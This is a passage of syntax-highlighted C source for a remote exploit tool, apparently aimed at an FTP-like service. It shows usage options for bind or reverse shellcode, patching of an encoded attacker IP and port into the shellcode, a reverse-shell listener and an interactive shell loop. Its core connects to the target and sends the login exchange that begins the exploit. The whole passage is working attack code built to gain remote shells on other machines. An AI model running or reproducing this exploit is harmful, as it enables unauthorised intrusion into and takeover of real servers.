</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%s -d &lt;host/ip&gt; [opts]\n\n"</span><span class="sc10">,</span><span class="sc11">argv0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Options:\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">" -h undocumented\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">" -p &lt;port&gt; to connect to [default: %u]\n"</span><span class="sc10">,</span><span class="sc11">default_port</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">" -s &lt;'bind'/'rev'&gt; shellcode type [default: bind]\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">" -P &lt;port&gt; for the shellcode [default: 5300]\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">" -H &lt;host/ip&gt; for the reverse shellcode\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">" -L setup the listener for the reverse shell\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">" -t &lt;target type&gt; [default 0]; choose below\n\n"</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Types:\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">targets</span><span class="sc10">)/</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">tsz</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
 </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">" %d %s\t[0x%.8x]\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">targets</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">os</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">targets</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">goreg</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">shell</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc4">4096</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">fd_set</span><span class="sc0"> </span><span class="sc11">fds</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[+] connected!\n\n"</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(;;)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
 </span><span class="sc11">FD_ZERO</span><span class="sc10">(&amp;</span><span class="sc11">fds</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">FD_SET</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">fds</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">FD_SET</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,&amp;</span><span class="sc11">fds</span><span class="sc10">);</span><span class="sc0">

       </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">select</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fds</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"[-] shell.select()"</span><span class="sc10">);</span><span class="sc0">

 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FD_ISSET</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">fds</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">retval</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc4">4096</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"[-] shell.recv(stdin)"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc11">retval</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">

 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FD_ISSET</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,&amp;</span><span class="sc11">fds</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">retval</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc4">4096</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"[-] shell.recv(socket)"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc11">retval</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">callback</span><span class="sc10">(</span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">sin</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc11">slen</span><span class="sc10">=</span><span class="sc4">16</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">port</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">s</span><span class="sc10">=</span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">6</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">bind</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
 </span><span class="sc11">kill</span><span class="sc10">(</span><span class="sc11">getppid</span><span class="sc10">(),</span><span class="sc11">SIGKILL</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"[-] shell.bind"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">listen</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">s</span><span class="sc10">=</span><span class="sc11">accept</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">sin</span><span class="sc10">,&amp;</span><span class="sc11">slen</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">shell</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"crap\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">**</span><span class="sc11">argv</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">**</span><span class="sc11">env</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">sin</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hostent</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">he</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">=</span><span class="sc11">default_port</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Host</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Port</span><span class="sc10">=</span><span class="sc4">5300</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">bindopt</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc11">pid</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">rip</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buff</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">jmp</span><span class="sc10">[]={</span><span class="sc6">"\xeb\x06"</span><span class="sc10">,</span><span class="sc6">"\xe9\x13\xfc\xff\xff"</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc11">BANNER</span><span class="sc0"> </span><span class="sc6">"\n"</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc10">==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
 </span><span class="sc11">usage</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">

</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">argc</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">+=</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc11">usage</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">

 </span><span class="sc5">switch</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">][</span><span class="sc4">1</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'t'</span><span class="sc10">:</span><span class="sc0">
   </span><span class="sc11">type</span><span class="sc10">=</span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
   </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'d'</span><span class="sc10">:</span><span class="sc0">
   </span><span class="sc11">host</span><span class="sc10">=</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
   </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'p'</span><span class="sc10">:</span><span class="sc0">
   </span><span class="sc11">port</span><span class="sc10">=</span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">])?:</span><span class="sc11">default_port</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'s'</span><span class="sc10">:</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc6">"rev"</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc11">bindopt</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'H'</span><span class="sc10">:</span><span class="sc0">
   </span><span class="sc11">Host</span><span class="sc10">=</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
   </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'P'</span><span class="sc10">:</span><span class="sc0">
   </span><span class="sc11">Port</span><span class="sc10">=</span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">])?:</span><span class="sc4">5300</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">Port</span><span class="sc10">=</span><span class="sc11">Port</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc0"> </span><span class="sc4">0xdede</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">Port</span><span class="sc10">=(</span><span class="sc11">Port</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xff</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">Port</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">bsh</span><span class="sc10">+</span><span class="sc4">0x57</span><span class="sc10">,&amp;</span><span class="sc11">Port</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">rsh</span><span class="sc10">+</span><span class="sc4">0x5a</span><span class="sc10">,&amp;</span><span class="sc11">Port</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">Port</span><span class="sc10">=</span><span class="sc11">Port</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc0"> </span><span class="sc4">0xdede</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">Port</span><span class="sc10">=(</span><span class="sc11">Port</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xff</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">Port</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'L'</span><span class="sc10">:</span><span class="sc0">
   </span><span class="sc11">pid</span><span class="sc10">++;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">--;</span><span class="sc0">
   </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'v'</span><span class="sc10">:</span><span class="sc0">
   </span><span class="sc11">verbose</span><span class="sc10">++;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">--;</span><span class="sc0">
   </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'h'</span><span class="sc10">:</span><span class="sc0">
   </span><span class="sc11">usage</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
  </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0">
   </span><span class="sc11">usage</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">verbose</span><span class="sc10">)</span><span class="sc0">
 </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"verbose!\n"</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">he</span><span class="sc10">=</span><span class="sc11">gethostbyname</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">))==</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
 </span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"[-] gethostbyname()"</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*((</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">in_addr</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">he</span><span class="sc10">-&gt;</span><span class="sc11">h_addr_list</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">port</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[.] launching attack on %s:%d..\n"</span><span class="sc10">,</span><span class="sc11">inet_ntoa</span><span class="sc10">(*((</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">in_addr</span><span class="sc0">
</span><span class="sc10">*)</span><span class="sc11">he</span><span class="sc10">-&gt;</span><span class="sc11">h_addr_list</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">])),</span><span class="sc11">port</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bindopt</span><span class="sc10">)</span><span class="sc0">
 </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[.] will try to put a bindshell on port %d.\n"</span><span class="sc10">,</span><span class="sc11">Port</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">he</span><span class="sc10">=</span><span class="sc11">gethostbyname</span><span class="sc10">(</span><span class="sc11">Host</span><span class="sc10">))==</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"[-] gethostbyname() for -H"</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">rip</span><span class="sc10">=*((</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">he</span><span class="sc10">-&gt;</span><span class="sc11">h_addr_list</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
 </span><span class="sc11">rip</span><span class="sc10">=</span><span class="sc11">rip</span><span class="sc10">^</span><span class="sc4">0xdededede</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">rsh</span><span class="sc10">+</span><span class="sc4">0x53</span><span class="sc10">,&amp;</span><span class="sc11">rip</span><span class="sc10">,</span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pid</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[.] setting up a listener on port %d.\n"</span><span class="sc10">,</span><span class="sc11">Port</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">pid</span><span class="sc10">=</span><span class="sc11">fork</span><span class="sc10">();</span><span class="sc0">
  </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pid</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">callback</span><span class="sc10">(</span><span class="sc11">Port</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0">
  </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc12">"[.] you should have a listener on
</span><span class="sc10">%</span><span class="sc11">s</span><span class="sc10">:%</span><span class="sc11">d</span><span class="sc10">.</span><span class="sc0">\</span><span class="sc11">n</span><span class="sc12">",inet_ntoa(*((struct in_addr
</span><span class="sc10">*)</span><span class="sc11">he</span><span class="sc10">-&gt;</span><span class="sc11">h_addr_list</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">])),</span><span class="sc11">Port</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[.] using type '%s'\n"</span><span class="sc10">,</span><span class="sc11">targets</span><span class="sc10">[</span><span class="sc11">type</span><span class="sc10">].</span><span class="sc11">os</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc2">// --------------------  core
</span><span class="sc0">
</span><span class="sc11">s</span><span class="sc10">=</span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">6</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc4">16</span><span class="sc10">)!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pid</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">kill</span><span class="sc10">(</span><span class="sc11">pid</span><span class="sc10">,</span><span class="sc11">SIGKILL</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"[-] connect()"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[+] connected, sending exploit\n"</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">buff</span><span class="sc10">=(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc4">4096</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">bzero</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc4">4096</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc6">"USER x\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc4">4095</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc6">"PASS x\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc4">4095</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

